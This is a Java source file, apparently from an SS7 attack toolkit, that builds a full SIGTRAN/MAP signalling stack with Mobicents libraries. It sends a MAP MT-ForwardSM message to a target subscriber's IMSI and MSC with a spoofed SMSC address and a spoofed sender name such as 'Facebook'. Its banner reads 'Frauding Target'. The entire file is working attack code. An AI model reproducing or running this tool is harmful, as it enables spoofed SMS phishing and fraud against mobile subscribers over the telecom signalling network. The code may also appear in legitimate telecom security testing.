
/**
 * Created by gh0 on 8/21/17.
 */

import java.util.Scanner;

import org.apache.log4j.Logger;
import org.mobicents.protocols.api.IpChannelType;
import org.mobicents.protocols.sctp.ManagementImpl;
import org.mobicents.protocols.ss7.indicator.NatureOfAddress;
import org.mobicents.protocols.ss7.indicator.RoutingIndicator;
import org.mobicents.protocols.ss7.m3ua.ExchangeType;
import org.mobicents.protocols.ss7.m3ua.Functionality;
import org.mobicents.protocols.ss7.m3ua.IPSPType;
import org.mobicents.protocols.ss7.m3ua.impl.M3UAManagementImpl;
import org.mobicents.protocols.ss7.m3ua.impl.parameter.ParameterFactoryImpl;
import org.mobicents.protocols.ss7.m3ua.parameter.RoutingContext;
import org.mobicents.protocols.ss7.m3ua.parameter.TrafficModeType;
import org.mobicents.protocols.ss7.map.MAPStackImpl;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContext;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextName;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextVersion;
import org.mobicents.protocols.ss7.map.api.MAPDialog;
import org.mobicents.protocols.ss7.map.api.MAPDialogListener;
import org.mobicents.protocols.ss7.map.api.MAPException;
import org.mobicents.protocols.ss7.map.api.MAPMessage;
import org.mobicents.protocols.ss7.map.api.MAPProvider;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortProviderReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortSource;
import org.mobicents.protocols.ss7.map.api.dialog.MAPNoticeProblemDiagnostic;
import org.mobicents.protocols.ss7.map.api.dialog.MAPRefuseReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPUserAbortChoice;
import org.mobicents.protocols.ss7.map.api.errors.MAPErrorMessage;
import org.mobicents.protocols.ss7.map.api.primitives.AddressNature;
import org.mobicents.protocols.ss7.map.api.primitives.AddressString;
import org.mobicents.protocols.ss7.map.api.primitives.IMSI;
import org.mobicents.protocols.ss7.map.api.primitives.MAPExtensionContainer;
import org.mobicents.protocols.ss7.map.api.primitives.NumberingPlan;
import org.mobicents.protocols.ss7.map.api.service.sms.AlertServiceCentreRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.AlertServiceCentreResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.ForwardShortMessageRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ForwardShortMessageResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.InformServiceCentreRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.MAPDialogSms;
import org.mobicents.protocols.ss7.map.api.service.sms.MAPServiceSmsListener;
import org.mobicents.protocols.ss7.map.api.service.sms.MoForwardShortMessageRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.MoForwardShortMessageResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.MtForwardShortMessageRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.MtForwardShortMessageResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.NoteSubscriberPresentRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ReadyForSMRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ReadyForSMResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.ReportSMDeliveryStatusRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ReportSMDeliveryStatusResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.SM_RP_DA;
import org.mobicents.protocols.ss7.map.api.service.sms.SM_RP_OA;
import org.mobicents.protocols.ss7.map.api.service.sms.SendRoutingInfoForSMRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.SendRoutingInfoForSMResponse;
import org.mobicents.protocols.ss7.map.api.smstpdu.AddressField;
import org.mobicents.protocols.ss7.map.api.smstpdu.DataCodingScheme;
import org.mobicents.protocols.ss7.map.api.smstpdu.NumberingPlanIdentification;
import org.mobicents.protocols.ss7.map.api.smstpdu.TypeOfNumber;
import org.mobicents.protocols.ss7.map.api.smstpdu.UserData;
import org.mobicents.protocols.ss7.map.service.sms.SmsSignalInfoImpl;
import org.mobicents.protocols.ss7.map.smstpdu.AbsoluteTimeStampImpl;
import org.mobicents.protocols.ss7.map.smstpdu.AddressFieldImpl;
import org.mobicents.protocols.ss7.map.smstpdu.ProtocolIdentifierImpl;
import org.mobicents.protocols.ss7.map.smstpdu.SmsDeliverTpduImpl;
import org.mobicents.protocols.ss7.sccp.OriginationType;
import org.mobicents.protocols.ss7.sccp.RuleType;
import org.mobicents.protocols.ss7.sccp.SccpProvider;
import org.mobicents.protocols.ss7.sccp.SccpResource;
import org.mobicents.protocols.ss7.sccp.impl.SccpStackImpl;
import org.mobicents.protocols.ss7.sccp.parameter.GlobalTitle0100;
import org.mobicents.protocols.ss7.sccp.parameter.SccpAddress;
import org.mobicents.protocols.ss7.tcap.TCAPStackImpl;
import org.mobicents.protocols.ss7.tcap.api.TCAPStack;
import org.mobicents.protocols.ss7.tcap.asn.ApplicationContextName;
import org.mobicents.protocols.ss7.tcap.asn.comp.Problem;

abstract class MTSMSStack implements MAPDialogListener, MAPServiceSmsListener {

    // MTP Details
    protected int CLIENT_SPC;
    protected int SERVER_SPC; // PC of adjacent STP

    protected int NETWORK_INDICATOR;

    protected final int SERVICE_INDICATOR = 3; // SCCP
    protected final int SSN_Client = 8; // MSC SSN
    protected final int SSN_Server = 8; // MSC SSN

    // M3UA details
    protected String CLIENT_IP;
    protected int CLIENT_PORT;

    protected String SERVER_IP;
    protected int SERVER_PORT;

    protected final String CLIENT_ASSOCIATION_NAME = "clientAsscoiation";

    String attacker_msc;
    String attacker_spoofed_smsc;
    String attacker_senderID;

    String target_msc;
    String target_imsi;
    String sms_content;

    protected final ParameterFactoryImpl factory = new ParameterFactoryImpl();

    protected MTSMSStack() {
	init();
    }

    public void init() {
	try {
	    Scanner user_input = new Scanner(System.in);

	    System.out.print("\033[34m[*]\033[0mSet Client PC: ");
	    CLIENT_SPC = user_input.nextInt();
	    System.out.print("\033[34m[*]\033[0mSet Peer PC: ");
	    SERVER_SPC = user_input.nextInt();

	    System.out.print("\033[34m[*]\033[0mSet Client IP: ");
	    CLIENT_IP = user_input.next();
	    System.out.print("\033[34m[*]\033[0mSet Client Port: ");
	    CLIENT_PORT = user_input.nextInt();
	    System.out.print("\033[34m[*]\033[0mSet Peer IP: ");
	    SERVER_IP = user_input.next();
	    System.out.print("\033[34m[*]\033[0mSet Peer Port: ");
	    SERVER_PORT = user_input.nextInt();

	    System.out.print("\033[34m[*]\033[0mSet Network Indicator [0] International [2] National: ");
	    NETWORK_INDICATOR = user_input.nextInt();

	    System.out.print("\033[34m[*]\033[0mSet Target's IMSI: ");
	    target_imsi = user_input.next();

	    System.out.print("\033[34m[*]\033[0mSet Target's MSC: ");
	    target_msc = user_input.next();

	    System.out.print("\033[34m[*]\033[0mSet your GT: ");
	    attacker_msc = user_input.next();

	    System.out.print("\033[34m[*]\033[0mSet a Spoofed SMSC GT: ");
	    attacker_spoofed_smsc = user_input.next();

	    System.out.print("\033[34m[*]\033[0mSet a Spoofed Sender Name(i.e Facebook): ");
	    attacker_senderID = user_input.next();
	    user_input.nextLine();

	    System.out.print("\033[34m[*]\033[0mSet the SMS Content: ");
	    sms_content = user_input.nextLine();

	    System.out.println("\033[34m[*]\033[0mStack components are set...");
	    System.out.println("\033[34m[*]\033[0mInitializing the Stack...");

	} catch (Exception ex) {
	    System.out.println("\033[31m[-]\033[0mError: " + ex.getMessage());
	    throw new RuntimeException(ex);
	}

    }
}

public class MTSMSSilent extends MTSMSStack {

    private static Logger logger = Logger.getLogger(MTSMSSilent.class);

    // SCTP
    private ManagementImpl sctpManagement;

    // M3UA
    private M3UAManagementImpl clientM3UAMgmt;

    // SCCP
    private SccpStackImpl sccpStack;
    private SccpProvider sccpProvider;
    private SccpResource sccpResource;

    // TCAP
    private TCAPStack tcapStack;

    // MAP
    private MAPStackImpl mapStack;
    private MAPProvider mapProvider;

    public MTSMSSilent() {
	// TODO Auto-generated constructor stub
    }

    protected void initializeStack(IpChannelType ipChannelType) throws Exception {

	this.initSCTP(ipChannelType);

	// Initialize M3UA first
	this.initM3UA();

	// Initialize SCCP
	this.initSCCP();

	// Initialize TCAP
	this.initTCAP();

	// Initialize MAP
	this.initMAP();

	// FInally start ASP
	this.clientM3UAMgmt.startAsp("ASP1");
    }

    private void initSCTP(IpChannelType ipChannelType) throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing SCTP Stack ....");
	try {
	    this.sctpManagement = new ManagementImpl("Client");
	    this.sctpManagement.setSingleThread(true);
	    this.sctpManagement.start();
	    this.sctpManagement.setConnectDelay(10000);
	    this.sctpManagement.removeAllResourses();

	    // 1. Create SCTP Association
	    sctpManagement.addAssociation(CLIENT_IP, CLIENT_PORT, SERVER_IP, SERVER_PORT, CLIENT_ASSOCIATION_NAME,
		    ipChannelType, null);
	    System.out.println("\033[32m[+]\033[0mInitialized SCTP Stack ....");
	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError initializing SCTP Stack: " + e.getMessage());
	    System.exit(1);
	}
    }

    private void initM3UA() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing M3UA Stack ....");
	this.clientM3UAMgmt = new M3UAManagementImpl("Client", null);
	this.clientM3UAMgmt.setTransportManagement(this.sctpManagement);
	this.clientM3UAMgmt.start();
	this.clientM3UAMgmt.removeAllResourses();

	// m3ua as create rc <rc> <ras-name>
	RoutingContext rc = factory.createRoutingContext(new long[] { 100l });
	TrafficModeType trafficModeType = factory.createTrafficModeType(TrafficModeType.Loadshare);

	try {
	    this.clientM3UAMgmt.createAs("AS1", Functionality.IPSP, ExchangeType.SE, IPSPType.CLIENT, rc,
		    trafficModeType, 1, null);

	    // Step 2 : Create ASP
	    this.clientM3UAMgmt.createAspFactory("ASP1", CLIENT_ASSOCIATION_NAME);

	    // Step3 : Assign ASP to AS
	    this.clientM3UAMgmt.assignAspToAs("AS1", "ASP1");

	    // Step 4: Add Route.
	    clientM3UAMgmt.addRoute(SERVER_SPC, CLIENT_SPC, SERVICE_INDICATOR, "AS1");

	    System.out.println("\033[32m[+]\033[0mInitialized M3UA Stack ....");
	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError initializing M3UA Stack: " + e.getMessage());
	    System.exit(2);

	}

    }

    private void initSCCP() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing SCCP Stack ....");
	try {
	    this.sccpStack = new SccpStackImpl("MapLoadClientSccpStack");
	    this.sccpStack.setMtp3UserPart(1, this.clientM3UAMgmt);

	    this.sccpStack.start();
	    this.sccpStack.removeAllResourses();

	    this.sccpStack.getSccpResource().addRemoteSpc(1, SERVER_SPC, 0, 0);
	    this.sccpStack.getSccpResource().addRemoteSsn(1, SERVER_SPC, SSN_Server, 0, false);

	    this.sccpStack.getRouter().addMtp3ServiceAccessPoint(1, 1, CLIENT_SPC, NETWORK_INDICATOR, 0, null);

	    this.sccpStack.getRouter().addMtp3Destination(1, 1, SERVER_SPC, SERVER_SPC, 0, 255, 255);

	    this.sccpProvider = this.sccpStack.getSccpProvider();

	    // SCCP routing table
	    GlobalTitle0100 remotGTs = this.sccpProvider.getParameterFactory().createGlobalTitle("*", 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);

	    // Replace The String with the GT of you SMCs
	    GlobalTitle0100 localmscGT = this.sccpProvider.getParameterFactory().createGlobalTitle(attacker_msc, 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);

	    this.sccpStack.getRouter().addRoutingAddress(1, this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remotGTs, SERVER_SPC, SSN_Server));

	    this.sccpStack.getRouter().addRoutingAddress(2, this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_DPC_AND_SSN, localmscGT, CLIENT_SPC, SSN_Client));

	    SccpAddress patternRemote = this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remotGTs, SERVER_SPC, SSN_Server);
	    SccpAddress patternLocal = this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localmscGT, CLIENT_SPC, SSN_Client);

	    String maskRemote = "K";
	    String maskLocal = "R";

	    // translate local GT to its POC+SSN (local rule)GTT
	    this.sccpStack.getRouter().addRule(1, RuleType.SOLITARY, null, OriginationType.LOCAL, patternRemote,
		    maskRemote, 1, -1, null, 0, null);
	    this.sccpStack.getRouter().addRule(2, RuleType.SOLITARY, null, OriginationType.REMOTE, patternLocal,
		    maskLocal, 2, -1, null, 0, null);

	    System.out.println("\033[32m[+]\033[0mInitialized SCCP Stack ....");
	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError initializing SCCP Stack: " + e.getMessage());
	    System.exit(3);
	}
    }

    private void initTCAP() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing TCAP Stack ....");
	try {
	    this.tcapStack = new TCAPStackImpl("Test", this.sccpStack.getSccpProvider(), SSN_Client);
	    this.tcapStack.start();
	    this.tcapStack.setDialogIdleTimeout(60000);
	    this.tcapStack.setInvokeTimeout(30000);
	    this.tcapStack.setMaxDialogs(2000);
	    System.out.println("\033[32m[+]\033[0mInitialized TCAP Stack ....");
	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError initializing TCAP Stack: " + e.getMessage());
	    System.exit(4);
	}
    }

    private void initMAP() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing MAP Stack ....");

	try {
	    this.mapStack = new MAPStackImpl("MAP-SMSC", this.tcapStack.getProvider());
	    this.mapProvider = this.mapStack.getMAPProvider();

	    this.mapProvider.addMAPDialogListener(this);
	    this.mapProvider.getMAPServiceSms().addMAPServiceListener(this);

	    this.mapProvider.getMAPServiceSms().acivate();

	    this.mapStack.start();

	    System.out.println("\033[32m[+]\033[0mInitialized MAP Stack ....");

	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError initializing MAP Stack: " + e.getMessage());
	    System.exit(5);
	}
    }

    private void initiateMTSMS() throws MAPException {
	try {
	    AddressString orig_smsc = this.mapProvider.getMAPParameterFactory()
		    .createAddressString(AddressNature.international_number, NumberingPlan.ISDN, attacker_spoofed_smsc);

	    IMSI imsi = this.mapProvider.getMAPParameterFactory().createIMSI(target_imsi);
	    SM_RP_DA sm_rp_da = this.mapProvider.getMAPParameterFactory().createSM_RP_DA(imsi);
	    SM_RP_OA sm_rp_oa = this.mapProvider.getMAPParameterFactory()
		    .createSM_RP_OA_ServiceCentreAddressOA(orig_smsc);

	    AddressField oa = new AddressFieldImpl(TypeOfNumber.Alphanumeric, NumberingPlanIdentification.Unknown,
		    attacker_senderID);

	    AbsoluteTimeStampImpl timeStamp = new AbsoluteTimeStampImpl(16, 4, 3, 15, 51, 18, 2);
	    ProtocolIdentifierImpl pi = new ProtocolIdentifierImpl(64);

	    DataCodingScheme dcs = this.mapProvider.getMAPSmsTpduParameterFactory().createDataCodingScheme(192);
	    UserData userData = this.mapProvider.getMAPSmsTpduParameterFactory().createUserData(sms_content, dcs, null,
		    null);

	    SmsDeliverTpduImpl tpdu = new SmsDeliverTpduImpl(false, false, false, true, oa, pi, timeStamp, userData);

	    SmsSignalInfoImpl sm_Rp_UI = new SmsSignalInfoImpl(tpdu, null);

	    GlobalTitle0100 GtAttackerMSC = this.sccpProvider.getParameterFactory().createGlobalTitle(attacker_msc, 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);

	    GlobalTitle0100 GtTargetMSC = this.sccpProvider.getParameterFactory().createGlobalTitle(target_msc, 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);

	    SccpAddress callingParty = this.sccpStack.getSccpProvider().getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, GtAttackerMSC, CLIENT_SPC, SSN_Client);
	    SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, GtTargetMSC, SERVER_SPC, SSN_Server);

	    MAPDialogSms mapDialogSms = this.mapProvider.getMAPServiceSms()
		    .createNewDialog(MAPApplicationContext.getInstance(MAPApplicationContextName.shortMsgMTRelayContext,
			    MAPApplicationContextVersion.version2), callingParty, null, calledParty, null);
	    mapDialogSms.addForwardShortMessageRequest(sm_rp_da, sm_rp_oa, sm_Rp_UI, false);

	    mapDialogSms.send();
	    System.out.println("\033[34m[*]\033[0mSpoofed SMS is sent.");
	    System.out.println("\033[34m[*]\033[0mClosing Session...");
	    try {
		Thread.sleep(10000);
		System.exit(0);
	    } catch (InterruptedException e) {
		e.printStackTrace();
	    }
	} catch (MAPException e) {

	    System.out.println("\033[31m[-]\033[0mError Sending SMS: " + e.getMessage());
	    System.exit(6);
	}
    }

    public void onDialogAccept(MAPDialog mapDialog, MAPExtensionContainer extensionContainer) {
	if (logger.isDebugEnabled()) {
	    logger.debug(String.format("onDialogAccept for DialogId=%d MAPExtensionContainer=%s",
		    mapDialog.getLocalDialogId(), extensionContainer));
	}
    }

    public void onDialogClose(MAPDialog mapDialog) {
	if (logger.isDebugEnabled()) {
	    logger.debug(String.format("DialogClose for Dialog=%d", mapDialog.getLocalDialogId()));
	}

    }

    public void onDialogDelimiter(MAPDialog mapDialog) {
	if (logger.isDebugEnabled()) {
	    logger.debug(String.format("onDialogDelimiter for DialogId=%d", mapDialog.getLocalDialogId()));
	}
    }

    public void onDialogNotice(MAPDialog mapDialog, MAPNoticeProblemDiagnostic noticeProblemDiagnostic) {
	System.err.printf("[-]Error: onDialogNotice for DialogId=%d MAPNoticeProblemDiagnostic=%s\n ",
		mapDialog.getLocalDialogId(), noticeProblemDiagnostic);
	System.exit(7);
    }

    public void onDialogProviderAbort(MAPDialog mapDialog, MAPAbortProviderReason abortProviderReason,
	    MAPAbortSource abortSource, MAPExtensionContainer extensionContainer) {
	System.err.printf(
		"[-]Error: onDialogProviderAbort for DialogId=%d MAPAbortProviderReason=%s MAPAbortSource=%s MAPExtensionContainer=%s\n",
		mapDialog.getLocalDialogId(), abortProviderReason, abortSource, extensionContainer);
	System.exit(8);
    }

    public void onDialogReject(MAPDialog mapDialog, MAPRefuseReason refuseReason,
	    ApplicationContextName alternativeApplicationContext, MAPExtensionContainer extensionContainer) {
	System.err.printf(
		"[-]Error: onDialogReject for DialogId=%d MAPRefuseReason=%s MAPProviderError=%s ApplicationContextName=%s MAPExtensionContainer=%s\n",
		mapDialog.getLocalDialogId(), refuseReason, alternativeApplicationContext, extensionContainer);
	System.exit(9);
    }

    public void onDialogRelease(MAPDialog mapDialog) {
	if (logger.isDebugEnabled()) {
	    logger.debug(String.format("onDialogResease for DialogId=%d", mapDialog.getLocalDialogId()));
	}
    }

    public void onDialogRequest(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
	    MAPExtensionContainer extensionContainer) {
	if (logger.isDebugEnabled()) {
	    logger.debug(String.format(
		    "onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s MAPExtensionContainer=%s\n",
		    mapDialog.getLocalDialogId(), destReference, origReference, extensionContainer));
	}
    }

    @Override
    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString addressString, AddressString addressString1,
	    AddressString addressString2, AddressString addressString3) {

    }

    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
	    IMSI arg3, AddressString arg4) {
	if (logger.isDebugEnabled()) {
	    logger.debug(String.format("onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s\n ",
		    mapDialog.getLocalDialogId(), destReference, origReference));
	}
    }

    public void onDialogTimeout(MAPDialog mapDialog) {
	System.err.printf("[-]Error: DialogTimeout for DialogId=%d\n", mapDialog.getLocalDialogId());
	System.exit(10);

    }

    public void onDialogUserAbort(MAPDialog mapDialog, MAPUserAbortChoice userReason,
	    MAPExtensionContainer extensionContainer) {
	System.err.printf("[-]Error: DialogUserAbort for DialogId=%d MAPUserAbortChoice=%s MAPExtensionContainer=%s\n",
		mapDialog.getLocalDialogId(), userReason, extensionContainer);
	System.exit(11);
    }

    public void onErrorComponent(MAPDialog mapDialog, Long invokeId, MAPErrorMessage mapErrorMessage) {
	System.err.printf("[-]Error: ErrorComponent for Dialog=%d and invokeId=%d MAPErrorMessage= %s\n",
		mapDialog.getLocalDialogId(), invokeId, mapErrorMessage);
	System.exit(12);
    }

    @Override
    public void onRejectComponent(MAPDialog mapDialog, Long aLong, Problem problem, boolean b) {

    }

    public void onInvokeTimeout(MAPDialog mapDialog, Long invokeId) {
	System.err.printf("[-]Error: MAP InvokeTimeout for Dialog=%d and invokeId=%d\n", mapDialog.getLocalDialogId(),
		invokeId);
	System.exit(13);
    }

    public void onMAPMessage(MAPMessage mapMessage) {
	// TODO Auto-generated method stub
    }

    public void onProviderErrorComponent(MAPDialog mapDialog, Long invokeId) {
	System.err.printf("[-]Error: ProviderErrorComponent for Dialog=%d and invokeId=%d MAPProviderError=%s\n",
		mapDialog.getLocalDialogId(), invokeId);
	System.exit(14);
    }

    public void onRejectComponent(MAPDialog mapDialog, Long invokeId, Problem problem) {
	System.err.printf("[-]Error: ProviderErrorComponent for Dialog=%d and invokeId=%d MAPProviderError=%s\n",
		mapDialog.getLocalDialogId(), invokeId);
	System.exit(15);
    }

    @Override
    public void onForwardShortMessageRequest(ForwardShortMessageRequest forwardShortMessageRequest) {

    }

    @Override
    public void onForwardShortMessageResponse(ForwardShortMessageResponse forwardShortMessageResponse) {

    }

    @Override
    public void onMoForwardShortMessageRequest(MoForwardShortMessageRequest moForwardShortMessageRequest) {

    }

    @Override
    public void onMoForwardShortMessageResponse(MoForwardShortMessageResponse moForwardShortMessageResponse) {

    }

    @Override
    public void onMtForwardShortMessageRequest(MtForwardShortMessageRequest mtForwardShortMessageRequest) {

    }

    @Override
    public void onMtForwardShortMessageResponse(MtForwardShortMessageResponse mtForwardShortMessageResponse) {

    }

    @Override
    public void onSendRoutingInfoForSMRequest(SendRoutingInfoForSMRequest sendRoutingInfoForSMRequest) {

    }

    public void onSendRoutingInfoForSMResponse(SendRoutingInfoForSMResponse sendRoutingInfoForSMRespInd) {

    }

    @Override
    public void onReportSMDeliveryStatusRequest(ReportSMDeliveryStatusRequest reportSMDeliveryStatusRequest) {

    }

    @Override
    public void onReportSMDeliveryStatusResponse(ReportSMDeliveryStatusResponse reportSMDeliveryStatusResponse) {

    }

    @Override
    public void onInformServiceCentreRequest(InformServiceCentreRequest informServiceCentreRequest) {

    }

    @Override
    public void onAlertServiceCentreRequest(AlertServiceCentreRequest alertServiceCentreRequest) {

    }

    @Override
    public void onAlertServiceCentreResponse(AlertServiceCentreResponse alertServiceCentreResponse) {

    }

    @Override
    public void onReadyForSMRequest(ReadyForSMRequest readyForSMRequest) {

    }

    @Override
    public void onReadyForSMResponse(ReadyForSMResponse readyForSMResponse) {

    }

    @Override
    public void onNoteSubscriberPresentRequest(NoteSubscriberPresentRequest noteSubscriberPresentRequest) {

    }

    public static void main(String args[]) {
	System.out.println("*********************************************");
	System.out.println("***             Frauding Target           ***");
	System.out.println("*********************************************");
	IpChannelType ipChannelType = IpChannelType.SCTP;

	final MTSMSSilent attacker = new MTSMSSilent();

	try {
	    attacker.initializeStack(ipChannelType);

	    // Lets pause for 20 seconds so stacks are initialized properly
	    Thread.sleep(20000);
	    attacker.initiateMTSMS();

	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError: " + e.getMessage());
	    System.exit(16);

	}
    }

}
